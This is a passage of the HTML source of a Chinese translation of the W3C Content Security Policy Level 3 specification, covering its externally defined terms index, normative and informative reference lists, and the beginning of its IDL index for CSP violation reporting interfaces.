                <li><span class="dfn-paneled" id="92896584">prefetch</span>
                <li><span class="dfn-paneled" id="215d47ca">准备脚本元素</span>
                <li><span class="dfn-paneled" id="9a517a7d">排队任务</span>
                <li><span class="dfn-paneled" id="0aa2f0c0">referrer</span>
                <li><span class="dfn-paneled" id="9c4c1e66">相关设置对象</span>
                <li><span class="dfn-paneled" id="ea6f3f13">运行 worker</span>
                <li><span class="dfn-paneled" id="5c35dd47">沙盒</span>
                <li><span class="dfn-paneled" id="da63e480">沙盒的原点浏览上下文标志</span>
                <li><span class="dfn-paneled" id="c1d81171">沙盒的脚本浏览上下文标志</span>
                <li><span class="dfn-paneled" id="457a6f4c">沙盒标志集</span>
                <li><span class="dfn-paneled" id="a23d12a9">scheme</span>
                <li><span class="dfn-paneled" id="0cf3964f">script</span>
                <li><span class="dfn-paneled" id="09f349d5">设置冻结的基础 URL</span>
                <li><span class="dfn-paneled" id="122f01fb">setInterval(handler, timeout, ...arguments)</span>
                <li><span class="dfn-paneled" id="3332e595">setTimeout(handler, timeout, ...arguments)</span>
                <li><span class="dfn-paneled" id="ba920583">style</span>
                <li><span class="dfn-paneled" id="3144baec">更新样式块</span>
                <li><span class="dfn-paneled" id="29964c8b">x-frame-options</span>
            </ul>
        <li>
            <a data-link-type="biblio">[INFRA]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="a3b18719">追加</span>
                <li><span class="dfn-paneled" id="7f9469b5">ASCII 不区分大小写</span>
                <li><span class="dfn-paneled" id="3b38c2fe">ASCII 数字</span>
                <li><span class="dfn-paneled" id="6f2dfa22">ASCII 小写</span>
                <li><span class="dfn-paneled" id="2d5a2765">ASCII 字符串</span>
                <li><span class="dfn-paneled" id="5fb1ed8a">ASCII 空白</span>
                <li><span class="dfn-paneled" id="3de9e659">字节序列</span>
                <li><span class="dfn-paneled" id="60184fa5">收集代码点序列</span>
                <li><span class="dfn-paneled" id="ae8def21">包含</span>
                <li><span class="dfn-paneled" id="f937b7b6">继续</span>
                <li><span class="dfn-paneled" id="a088e610">转换</span>
                <li><span class="dfn-paneled" id="9c05f1bf">以...结束</span>
                <li><span class="dfn-paneled" id="16d07e10">对于每个</span>
                <li><span class="dfn-paneled" id="5e72f9d3">infra</span>
                <li><span class="dfn-paneled" id="7a87d819">是</span>
                <li><span class="dfn-paneled" id="6b815fdd">为空</span>
                <li><span class="dfn-paneled" id="d8b963e8">同构解码</span>
                <li><span class="dfn-paneled" id="f02cd417">迭代</span>
                <li><span class="dfn-paneled" id="649608b9">列表</span>
                <li><span class="dfn-paneled" id="84b454ff">有序映射</span>
                <li><span class="dfn-paneled" id="692595fe">有序集合</span>
                <li><span class="dfn-paneled" id="4c07280e">将 infra 值序列化为 JSON 字节</span>
                <li><span class="dfn-paneled" id="15e48c39">集合</span>
                <li><span class="dfn-paneled" id="0204d188">大小</span>
                <li><span class="dfn-paneled" id="23cac254">将字符串按 ASCII 空白分割</span>
                <li><span class="dfn-paneled" id="54627f47">以...开始</span>
                <li><span class="dfn-paneled" id="7a3dbdb1">严格分割字符串</span>
                <li><span class="dfn-paneled" id="0698d556">字符串</span>
                <li><span class="dfn-paneled" id="a37f05fd">去除前导和尾部 ASCII 空白</span>
                <li><span class="dfn-paneled" id="febebe0e">范围</span>
            </ul>
        <li>
            <a data-link-type="biblio">[REPORTING]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="4d5cebba">报告类型</span>
                <li><span class="dfn-paneled" id="3c4b330a">对 reportingobservers 可见</span>
            </ul>
        <li>
            <a data-link-type="biblio">[REPORTING-1]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="574c86b8">ReportBody</span>
                <li><span class="dfn-paneled" id="73d9f866">endpoint</span>
                <li><span class="dfn-paneled" id="07d359a5">生成并排队报告</span>
            </ul>
        <li>
            <a data-link-type="biblio">[RFC3986]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="546e361d">绝对路径</span>
                <li><span class="dfn-paneled" id="01149665">scheme</span>
                <li><span class="dfn-paneled" id="cdec7b52">URI 引用</span>
            </ul>
        <li>
            <a data-link-type="biblio">[RFC4648]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="af6109ae">base64 编码</span>
                <li><span class="dfn-paneled" id="fe4f8855">base64url 编码</span>
            </ul>
        <li>
            <a data-link-type="biblio">[RFC5234]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="41a7917e">alpha</span>
                <li><span class="dfn-paneled" id="702d8ead">digit</span>
                <li><span class="dfn-paneled" id="c6544229">vchar</span>
            </ul>
        <li>
            <a data-link-type="biblio">[RFC9110]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="11d73a3a">ows</span>
                <li><span class="dfn-paneled" id="129a3698">表示</span>
                <li><span class="dfn-paneled" id="6dc09e8a">资源表示</span>
                <li><span class="dfn-paneled" id="f07429d2">token</span>
            </ul>
        <li>
            <a data-link-type="biblio">[SERVICE-WORKERS]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="570073d7">ServiceWorker</span>
            </ul>
        <li>
            <a data-link-type="biblio">[SHA2]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="c6be056c">sha-256</span>
                <li><span class="dfn-paneled" id="7da56b7d">sha-384</span>
                <li><span class="dfn-paneled" id="b1dc7351">sha-512</span>
            </ul>
        <li>
            <a data-link-type="biblio">[TRUSTED-TYPES]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="49412eb8">获取 Trusted Type 合规字符串</span>
                <li><span class="dfn-paneled" id="605640df">TrustedScript</span>
                <li><span class="dfn-paneled" id="c21b1fe2">data</span>
            </ul>
        <li>
            <a data-link-type="biblio">[URL]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="f06432d7">URL</span>
                <li><span class="dfn-paneled" id="b9d1df32">基础 URL</span>
                <li><span class="dfn-paneled" id="12553145">默认端口</span>
                <li><span class="dfn-paneled" id="22477314">域名</span>
                <li><span class="dfn-paneled" id="ed948033">片段</span>
                <li><span class="dfn-paneled" id="752d140b">主机</span>
                <li><span class="dfn-paneled" id="5718c334">主机 <small>(用于 URL)</small></span>
                <li><span class="dfn-paneled" id="959ad97b">origin</span>
                <li><span class="dfn-paneled" id="a1288f2a">密码</span>
                <li><span class="dfn-paneled" id="c0868016">路径</span>
                <li><span class="dfn-paneled" id="8f69ce41">百分比解码</span>
                <li><span class="dfn-paneled" id="17bd86ff">端口 <small>(用于 URL)</small></span>
                <li><span class="dfn-paneled" id="852ada56">端口 <small>(用于 url)</small></span>
                <li><span class="dfn-paneled" id="3a711be7">scheme</span>
                <li><span class="dfn-paneled" id="dcffbccd">url</span>
                <li><span class="dfn-paneled" id="ca3ca4ae">url 解析器</span>
                <li><span class="dfn-paneled" id="5442ea33">url 序列化器</span>
                <li><span class="dfn-paneled" id="218c9455">用户名</span>
            </ul>
        <li>
            <a data-link-type="biblio">[WEBASSEMBLY-JS-API]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="955b99c4">WebAssembly.CompileError</span>
                <li><span class="dfn-paneled" id="60675e26">WebAssembly.compile()</span>
                <li><span class="dfn-paneled" id="a56b2832">WebAssembly.instantiate()</span>
                <li><span class="dfn-paneled" id="6819dc54">new WebAssembly.Module()</span>
            </ul>
        <li>
            <a data-link-type="biblio">[WEBASSEMBLY-JS-CSP-PROPOSAL]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="784d7d80">HostEnsureCanCompileWasmBytes()</span>
            </ul>
        <li>
            <a data-link-type="biblio">[WEBASSEMBLY-WEB-API]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="53f02be3">WebAssembly.compileStreaming()</span>
                <li><span class="dfn-paneled" id="2a675f38">WebAssembly.instantiateStreaming()</span>
            </ul>
        <li>
            <a data-link-type="biblio">[WEBIDL]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="8855a9aa">DOMString</span>
                <li><span class="dfn-paneled" id="f4531911">Default</span>
                <li><span class="dfn-paneled" id="522350fb">EvalError</span>
                <li><span class="dfn-paneled" id="889e932f">Exposed</span>
                <li><span class="dfn-paneled" id="b0d7f3c3">USVString</span>
                <li><span class="dfn-paneled" id="a32c65d4">实现</span>
                <li><span class="dfn-paneled" id="56f81a8e">new</span>
                <li><span class="dfn-paneled" id="efd1ec5d">object</span>
                <li><span class="dfn-paneled" id="e97a9688">unsigned long</span>
                <li><span class="dfn-paneled" id="450958f7">unsigned short</span>
            </ul>
        <li>
            <a data-link-type="biblio">[WEBRTC]</a> 定义了以下术语：
            <ul>
                <li><span class="dfn-paneled" id="f48ea995">管理上禁止</span>
            </ul>
    </ul>
    <h2 class="no-num no-ref heading settled" id="references"><span class="content">参考文献</span><a class="self-link"
            href="#references"></a></h2>
    <h3 class="no-num no-ref heading settled" id="normative"><span class="content">规范性参考文献</span><a class="self-link"
            href="#normative"></a></h3>
    <dl>
        <dt id="biblio-csp3">[CSP3]
        <dd>Mike West; Antonio Sartori. <a href="https://www.w3.org/TR/CSP3/"><cite>内容安全策略第 3 级</cite></a>. 2024年9月9日.
            WD. URL: <a href="https://www.w3.org/TR/CSP3/">https://www.w3.org/TR/CSP3/</a>
        <dt id="biblio-css-cascade-5">[CSS-CASCADE-5]
        <dd>Elika Etemad; Miriam Suzanne; Tab Atkins Jr.. <a href="https://www.w3.org/TR/css-cascade-5/"><cite>CSS
                    级联和继承第 5 级</cite></a>. 2022年1月13日. CR. URL: <a
                href="https://www.w3.org/TR/css-cascade-5/">https://www.w3.org/TR/css-cascade-5/</a>
        <dt id="biblio-cssom">[CSSOM]
        <dd>Daniel Glazman; Emilio Cobos Álvarez. <a href="https://www.w3.org/TR/cssom-1/"><cite>CSS 对象模型
                    (CSSOM)</cite></a>. 2021年8月26日. WD. URL: <a
                href="https://www.w3.org/TR/cssom-1/">https://www.w3.org/TR/cssom-1/</a>
        <dt id="biblio-dom">[DOM]
        <dd>Anne van Kesteren. <a href="https://dom.spec.whatwg.org/"><cite>DOM 现行标准</cite></a>. URL: <a
                href="https://dom.spec.whatwg.org/">https://dom.spec.whatwg.org/</a>
        <dt id="biblio-ecma262">[ECMA262]
        <dd>Brian Terlson; Allen Wirfs-Brock. <a href="https://tc39.github.io/ecma262/"><cite>ECMAScript®
                    语言规范</cite></a>. URL: <a href="https://tc39.github.io/ecma262/">https://tc39.github.io/ecma262/</a>
        <dt id="biblio-encoding">[ENCODING]
        <dd>Anne van Kesteren. <a href="https://encoding.spec.whatwg.org/"><cite>编码标准</cite></a>. URL: <a
                href="https://encoding.spec.whatwg.org/">https://encoding.spec.whatwg.org/</a>
        <dt id="biblio-fetch">[FETCH]
        <dd>Anne van Kesteren. <a href="https://fetch.spec.whatwg.org/"><cite>Fetch 现行标准</cite></a>. URL: <a
                href="https://fetch.spec.whatwg.org/">https://fetch.spec.whatwg.org/</a>
        <dt id="biblio-html">[HTML]
        <dd>Anne van Kesteren; et al. <a href="https://html.spec.whatwg.org/multipage/"><cite>HTML 现行标准</cite></a>. URL:
            <a href="https://html.spec.whatwg.org/multipage/">https://html.spec.whatwg.org/multipage/</a>
        <dt id="biblio-infra">[INFRA]
        <dd>Anne van Kesteren; Domenic Denicola. <a href="https://infra.spec.whatwg.org/"><cite>Infra 现行标准</cite></a>.
            URL: <a href="https://infra.spec.whatwg.org/">https://infra.spec.whatwg.org/</a>
        <dt id="biblio-reporting">[REPORTING]
        <dd>Ilya Gregorik; Mike West. <a href="https://wicg.github.io/reporting/"><cite>报告 API</cite></a>. URL: <a
                href="https://wicg.github.io/reporting/">https://wicg.github.io/reporting/</a>
        <dt id="biblio-reporting-1">[REPORTING-1]
        <dd>Douglas Creager; Ian Clelland; Mike West. <a href="https://www.w3.org/TR/reporting-1/"><cite>报告
                    API</cite></a>. 2024年8月13日. WD. URL: <a
                href="https://www.w3.org/TR/reporting-1/">https://www.w3.org/TR/reporting-1/</a>
        <dt id="biblio-rfc2119">[RFC2119]
        <dd>S. Bradner. <a href="https://datatracker.ietf.org/doc/html/rfc2119"><cite>RFC 中用于表明需求等级的关键字</cite></a>.
            1997年3月. 最佳现行实践. URL: <a
                href="https://datatracker.ietf.org/doc/html/rfc2119">https://datatracker.ietf.org/doc/html/rfc2119</a>
        <dt id="biblio-rfc3492">[RFC3492]
        <dd>A. Costello. <a href="https://www.rfc-editor.org/rfc/rfc3492"><cite>Punycode：Unicode 的 Bootstring
                    编码，用于应用中的国际化域名 (IDNA)</cite></a>. 2003年3月. 提议标准. URL: <a
                href="https://www.rfc-editor.org/rfc/rfc3492">https://www.rfc-editor.org/rfc/rfc3492</a>
        <dt id="biblio-rfc3864">[RFC3864]
        <dd>G. Klyne; M. Nottingham; J. Mogul. <a
                href="https://www.rfc-editor.org/rfc/rfc3864"><cite>消息头字段的注册程序</cite></a>. 2004年9月. 最佳现行实践. URL: <a
                href="https://www.rfc-editor.org/rfc/rfc3864">https://www.rfc-editor.org/rfc/rfc3864</a>
        <dt id="biblio-rfc3986">[RFC3986]
        <dd>T. Berners-Lee; R. Fielding; L. Masinter. <a href="https://www.rfc-editor.org/rfc/rfc3986"><cite>统一资源标识符
                    (URI)：通用语法</cite></a>. 2005年1月. 网络标准. URL: <a
                href="https://www.rfc-editor.org/rfc/rfc3986">https://www.rfc-editor.org/rfc/rfc3986</a>
        <dt id="biblio-rfc4648">[RFC4648]
        <dd>S. Josefsson. <a href="https://www.rfc-editor.org/rfc/rfc4648"><cite>Base16、Base32 和 Base64 数据编码</cite></a>.
            2006年10月. 提议标准. URL: <a
                href="https://www.rfc-editor.org/rfc/rfc4648">https://www.rfc-editor.org/rfc/rfc4648</a>
        <dt id="biblio-rfc5234">[RFC5234]
        <dd>D. Crocker, Ed.; P. Overell. <a href="https://www.rfc-editor.org/rfc/rfc5234"><cite>用于语法规范的增强
                    BNF：ABNF</cite></a>. 2008年1月. 网络标准. URL: <a
                href="https://www.rfc-editor.org/rfc/rfc5234">https://www.rfc-editor.org/rfc/rfc5234</a>
        <dt id="biblio-rfc7762">[RFC7762]
        <dd>M. West. <a href="https://www.rfc-editor.org/rfc/rfc7762"><cite>内容安全策略指令注册的初始分配</cite></a>. 2016年1月. 信息性.
            URL: <a href="https://www.rfc-editor.org/rfc/rfc7762">https://www.rfc-editor.org/rfc/rfc7762</a>
        <dt id="biblio-rfc8288">[RFC8288]
        <dd>M. Nottingham. <a href="https://httpwg.org/specs/rfc8288.html"><cite>Web 链接</cite></a>. 2017年10月. 提议标准. URL:
            <a href="https://httpwg.org/specs/rfc8288.html">https://httpwg.org/specs/rfc8288.html</a>
        <dt id="biblio-rfc9110">[RFC9110]
        <dd>R. Fielding, Ed.; M. Nottingham, Ed.; J. Reschke, Ed.. <a
                href="https://httpwg.org/specs/rfc9110.html"><cite>HTTP 语义</cite></a>. 2022年6月. 网络标准. URL: <a
                href="https://httpwg.org/specs/rfc9110.html">https://httpwg.org/specs/rfc9110.html</a>
        <dt id="biblio-service-workers">[SERVICE-WORKERS]
        <dd>Jake Archibald; Marijn Kruisselbrink. <a
                href="https://www.w3.org/TR/service-workers/"><cite>服务工作者</cite></a>. 2022年7月12日. CR. URL: <a
                href="https://www.w3.org/TR/service-workers/">https://www.w3.org/TR/service-workers/</a>
        <dt id="biblio-sri">[SRI]
        <dd>Devdatta Akhawe; et al. <a href="https://www.w3.org/TR/SRI/"><cite>子资源完整性</cite></a>. 2016年6月23日. REC. URL:
            <a href="https://www.w3.org/TR/SRI/">https://www.w3.org/TR/SRI/</a>
        <dt id="biblio-trusted-types">[TRUSTED-TYPES]
        <dd>Krzysztof Kotowicz. <a href="https://www.w3.org/TR/trusted-types/"><cite>可信类型</cite></a>. 2024年9月10日. WD.
            URL: <a href="https://www.w3.org/TR/trusted-types/">https://www.w3.org/TR/trusted-types/</a>
        <dt id="biblio-url">[URL]
        <dd>Anne van Kesteren. <a href="https://url.spec.whatwg.org/"><cite>URL 标准</cite></a>. URL: <a
                href="https://url.spec.whatwg.org/">https://url.spec.whatwg.org/</a>
        <dt id="biblio-webidl">[WEBIDL]
        <dd>Edgar Chen; Timothy Gu. <a href="https://webidl.spec.whatwg.org/"><cite>Web IDL 标准</cite></a>. URL: <a
                href="https://webidl.spec.whatwg.org/">https://webidl.spec.whatwg.org/</a>
        <dt id="biblio-webrtc">[WEBRTC]
        <dd>Cullen Jennings; et al. <a href="https://www.w3.org/TR/webrtc/"><cite>WebRTC: 浏览器中的实时通信</cite></a>.
            2024年10月8日. REC. URL: <a href="https://www.w3.org/TR/webrtc/">https://www.w3.org/TR/webrtc/</a>
    </dl>
    <h3 class="no-num no-ref heading settled" id="informative"><span class="content">说明性参考文献</span><a class="self-link"
            href="#informative"></a></h3>
    <dl>
        <dt id="biblio-appmanifest">[APPMANIFEST]
        <dd>Marcos Caceres; et al. <a href="https://www.w3.org/TR/appmanifest/"><cite>Web 应用程序清单</cite></a>.
            2024年10月11日. WD. URL: <a href="https://www.w3.org/TR/appmanifest/">https://www.w3.org/TR/appmanifest/</a>
        <dt id="biblio-beacon">[BEACON]
        <dd>Ilya Grigorik; Alois Reitbauer. <a href="https://www.w3.org/TR/beacon/"><cite>信标</cite></a>. 2022年8月3日. CR.
            URL: <a href="https://www.w3.org/TR/beacon/">https://www.w3.org/TR/beacon/</a>
        <dt id="biblio-csp2">[CSP2]
        <dd>Mike West; Adam Barth; Daniel Veditz. <a href="https://www.w3.org/TR/CSP2/"><cite>内容安全策略第 2 级</cite></a>.
            2016年12月15日. REC. URL: <a href="https://www.w3.org/TR/CSP2/">https://www.w3.org/TR/CSP2/</a>
        <dt id="biblio-css-abuse">[CSS-ABUSE]
        <dd>Chris Evans. <a
                href="https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html"><cite>通用跨浏览器跨域窃取</cite></a>.
            2009年12月28日. URL: <a
                href="https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html">https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html</a>
        <dt id="biblio-eventsource">[EVENTSOURCE]
        <dd>Ian Hickson. <a href="https://www.w3.org/TR/eventsource/"><cite>服务器发送事件</cite></a>. 2021年1月28日. REC. URL: <a
                href="https://www.w3.org/TR/eventsource/">https://www.w3.org/TR/eventsource/</a>
        <dt id="biblio-filedescriptor-2015">[FILEDESCRIPTOR-2015]
        <dd>filedescriptor. <a href="https://blog.innerht.ml/csp-2015/#danglingmarkupinjection"><cite>CSP
                    2015</cite></a>. 2015年11月23日. URL: <a
                href="https://blog.innerht.ml/csp-2015/#danglingmarkupinjection">https://blog.innerht.ml/csp-2015/#danglingmarkupinjection</a>
        <dt id="biblio-h5sc3">[H5SC3]
        <dd>Mario Heiderich. <a
                href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22"><cite>H5SC
                    小挑战 3：“Sh*t, 这是 CSP!”</cite></a>. URL: <a
                href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22">https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22</a>
        <dt id="biblio-html-design">[HTML-DESIGN]
        <dd>Anne Van Kesteren; Maciej Stachowiak. <a href="https://www.w3.org/TR/html-design-principles/"><cite>HTML
                    设计原则</cite></a>. URL: <a
                href="https://www.w3.org/TR/html-design-principles/">https://www.w3.org/TR/html-design-principles/</a>
        <dt id="biblio-long-live-csp">[LONG-LIVE-CSP]
        <dd>Lukas Weichselbaum; et al. <a href="https://dl.acm.org/doi/10.1145/2976749.2978363"><cite>CSP 已死，CSP
                    长存！关于白名单的不安全性及内容安全策略的未来</cite></a>. 2016年10月24日. URL: <a
                href="https://dl.acm.org/doi/10.1145/2976749.2978363">https://dl.acm.org/doi/10.1145/2976749.2978363</a>
        <dt id="biblio-mix">[MIX]
        <dd>Emily Stark; Mike West; Carlos IbarraLopez. <a
                href="https://www.w3.org/TR/mixed-content/"><cite>混合内容</cite></a>. 2023年2月23日. CR. URL: <a
                href="https://www.w3.org/TR/mixed-content/">https://www.w3.org/TR/mixed-content/</a>
        <dt id="biblio-timing">[TIMING]
        <dd>Paul Stone. <a
                href="https://owasp.org/www-pdf-archive/HackPra_Allstars-Browser_Timing_Attacks_-_Paul_Stone.pdf"><cite>像素完美的定时攻击</cite></a>.
            URL: <a
                href="https://owasp.org/www-pdf-archive/HackPra_Allstars-Browser_Timing_Attacks_-_Paul_Stone.pdf">https://owasp.org/www-pdf-archive/HackPra_Allstars-Browser_Timing_Attacks_-_Paul_Stone.pdf</a>
        <dt id="biblio-uisecurity">[UISECURITY]
        <dd>Brad Hill. <a href="https://www.w3.org/TR/UISecurity/"><cite>用户界面安全和可见性 API</cite></a>. 2016年6月7日. WD. URL:
            <a href="https://www.w3.org/TR/UISecurity/">https://www.w3.org/TR/UISecurity/</a>
        <dt id="biblio-upgrade-insecure-requests">[UPGRADE-INSECURE-REQUESTS]
        <dd>Mike West. <a href="https://www.w3.org/TR/upgrade-insecure-requests/"><cite>升级不安全请求</cite></a>. 2015年10月8日.
            CR. URL: <a
                href="https://www.w3.org/TR/upgrade-insecure-requests/">https://www.w3.org/TR/upgrade-insecure-requests/</a>
        <dt id="biblio-webdev-strictcsp">[WEBDEV-STRICTCSP]
        <dd>Lukas Weichselbaum. <a href="https://web.dev/strict-csp/"><cite>使用严格的内容安全策略 (CSP) 来减轻跨站脚本 (XSS)
                    攻击</cite></a>. 2021年3月15日. URL: <a
                href="https://web.dev/strict-csp/">https://web.dev/strict-csp/</a>
        <dt id="biblio-websockets">[WEBSOCKETS]
        <dd>Adam Rice. <a href="https://websockets.spec.whatwg.org/"><cite>WebSockets 现行标准</cite></a>. URL: <a
                href="https://websockets.spec.whatwg.org/">https://websockets.spec.whatwg.org/</a>
        <dt id="biblio-xhr">[XHR]
        <dd>Anne van Kesteren. <a href="https://xhr.spec.whatwg.org/"><cite>XMLHttpRequest 现行标准</cite></a>. URL: <a
                href="https://xhr.spec.whatwg.org/">https://xhr.spec.whatwg.org/</a>
        <dt id="biblio-xslt">[XSLT]
        <dd>James Clark. <a href="https://www.w3.org/TR/xslt-10/"><cite>XSL 转换 (XSLT) 版本 1.0</cite></a>. 1999年11月16日.
            REC. URL: <a href="https://www.w3.org/TR/xslt-10/">https://www.w3.org/TR/xslt-10/</a>
    </dl>
    <h2 class="no-num no-ref heading settled" id="idl-index"><span class="content">IDL 索引</span><a class="self-link"
            href="#idl-index"></a></h2>
    <pre class="idl highlight def">[<a class="idl-code" data-link-type="extended-attribute" href="https://webidl.spec.whatwg.org/#Exposed"><c- g>Exposed</c-></a>=<c- n>Window</c->]
<c- b>interface</c-> <a href="#cspviolationreportbody"><code><c- g>CSPViolationReportBody</c-></code></a> : <a data-link-type="idl-name" href="https://www.w3.org/TR/reporting-1/#reportbody"><c- n>ReportBody</c-></a> {
  [<a class="idl-code" data-link-type="extended-attribute" href="https://webidl.spec.whatwg.org/#Default"><c- g>Default</c-></a>] <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-object"><c- b>object</c-></a> <a href="#dom-cspviolationreportbody-tojson"><code><c- g>toJSON</c-></code></a>();
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a> <a data-readonly data-type="USVString" href="#dom-cspviolationreportbody-documenturl"><code><c- g>documentURL</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>? <a data-readonly data-type="USVString?" href="#dom-cspviolationreportbody-referrer"><code><c- g>referrer</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>? <a data-readonly data-type="USVString?" href="#dom-cspviolationreportbody-blockedurl"><code><c- g>blockedURL</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a> <a data-readonly data-type="DOMString" href="#dom-cspviolationreportbody-effectivedirective"><code><c- g>effectiveDirective</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a> <a data-readonly data-type="DOMString" href="#dom-cspviolationreportbody-originalpolicy"><code><c- g>originalPolicy</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>? <a data-readonly data-type="USVString?" href="#dom-cspviolationreportbody-sourcefile"><code><c- g>sourceFile</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>? <a data-readonly data-type="DOMString?" href="#dom-cspviolationreportbody-sample"><code><c- g>sample</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition"><c- n>SecurityPolicyViolationEventDisposition</c-></a> <a data-readonly data-type="SecurityPolicyViolationEventDisposition" href="#dom-cspviolationreportbody-disposition"><code><c- g>disposition</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-short"><c- b>unsigned</c-> <c- b>short</c-></a> <a data-readonly data-type="unsigned short" href="#dom-cspviolationreportbody-statuscode"><code><c- g>statusCode</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>? <a data-readonly data-type="unsigned long?" href="#dom-cspviolationreportbody-linenumber"><code><c- g>lineNumber</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>? <a data-readonly data-type="unsigned long?" href="#dom-cspviolationreportbody-columnnumber"><code><c- g>columnNumber</c-></code></a>;
};

<c- b>enum</c-> <a href="#enumdef-securitypolicyviolationeventdisposition"><code><c- g>SecurityPolicyViolationEventDisposition</c-></code></a> {
  <a href="#dom-securitypolicyviolationeventdisposition-enforce"><code><c- s>"enforce"</c-></code></a>, <a href="#dom-securitypolicyviolationeventdisposition-report"><code><c- s>"report"</c-></code></a>
};

[<a class="idl-code" data-link-type="extended-attribute" href="https://webidl.spec.whatwg.org/#Exposed"><c- g>Exposed</c-></a>=(<c- n>Window</c->,<c- n>Worker</c->)]
<c- b>interface</c-> <a href="#securitypolicyviolationevent"><code><c- g>SecurityPolicyViolationEvent</c-></code></a> : <a data-link-type="idl-name" href="https://dom.spec.whatwg.org/#event"><c- n>Event</c-></a> {
    <a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent"><code><c- g>constructor</c-></code></a>(<a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a> <a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-type"><code><c- g>type</c-></code></a>, <c- b>optional</c-> <a data-link-type="idl-name" href="#dictdef-securitypolicyviolationeventinit"><c- n>SecurityPolicyViolationEventInit</c-></a> <a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-eventinitdict"><code><c- g>eventInitDict</c-></code></a> = {});
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-documenturi"><code><c- g>documentURI</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-referrer"><code><c- g>referrer</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-blockeduri"><code><c- g>blockedURI</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-readonly data-type="DOMString" href="#dom-securitypolicyviolationevent-effectivedirective"><code><c- g>effectiveDirective</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-readonly data-type="DOMString" href="#dom-securitypolicyviolationevent-violateddirective"><code><c- g>violatedDirective</c-></code></a>; // historical alias of effectiveDirective
